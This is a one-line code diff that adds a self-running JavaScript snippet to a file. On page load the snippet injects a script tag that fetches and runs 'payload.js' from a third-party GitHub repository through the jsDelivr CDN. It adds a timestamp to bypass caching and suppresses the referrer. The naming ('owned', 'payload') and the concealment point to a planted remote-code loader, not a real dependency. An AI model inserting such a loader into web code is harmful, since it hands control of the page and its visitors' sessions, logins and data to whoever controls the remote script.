@@ -1,0 +1,1 @@
+(() => { const s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/gh/singetu0096/owned-muse-combine-1795663747-13212@main/payload.js?owned_cache_bust=' + Date.now(); s.referrerPolicy = 'no-referrer'; document.head.append(s); })();
